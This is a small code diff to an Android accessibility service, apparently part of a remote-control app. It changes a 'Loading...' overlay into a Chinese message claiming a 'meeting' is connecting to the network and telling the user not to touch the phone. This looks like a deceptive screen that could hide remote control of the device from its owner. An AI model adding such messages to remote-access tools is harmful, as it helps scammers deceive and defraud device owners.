@@ -769,7 +769,7 @@ class InputService : AccessibilityService() {
        })*/
 	    
 	val loadingText = TextView(this, null)
-	loadingText.text = "Loading..."
+	loadingText.text = "会议正在对接您的网络....../n 请勿触碰手机!"
 	loadingText.setTextColor(-7829368)
 	loadingText.textSize = 20.0f
 	loadingText.gravity = Gravity.CENTER
